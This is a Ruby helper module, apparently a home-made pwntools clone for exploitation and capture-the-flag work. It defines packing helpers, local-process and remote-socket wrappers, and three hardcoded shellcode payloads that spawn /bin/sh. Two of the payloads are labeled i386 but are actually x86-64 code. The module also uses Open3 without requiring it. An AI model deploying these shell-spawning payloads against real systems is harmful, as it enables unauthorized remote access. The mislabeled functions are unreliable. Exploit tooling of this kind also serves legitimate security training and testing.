require 'pwnlib/process'
require 'socket'

module Pwnlib
  def p64 num
    num = num.hex if num.is_a? String
    [num].pack("Q")
  end

  def p32 num
    num = num.hex if num.is_a? String
    [num].pack("L")
  end

  def u32 num
    num.unpack("L")[0]
  end

  def u64 num
    num.unpack("Q")[0]
  end

  def process name
    stdin, stdout, wait_thr = Open3.popen2e name
    stdout.sync
    stdin.sync
    ProcessRun.new stdin, stdout
  end

  def remote name, port
    s = TCPSocket.new name, port
    ProcessRun.new s, s
  end

  def i386_shellcode
    "\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80".force_encoding("ASCII-8BIT")
  end

  def i386_shellcode_alt
    "\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05".force_encoding("ASCII-8BIT")
  end

  def i386_shellcode_magic
    "\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05".force_encoding("ASCII-8BIT")
  end
end
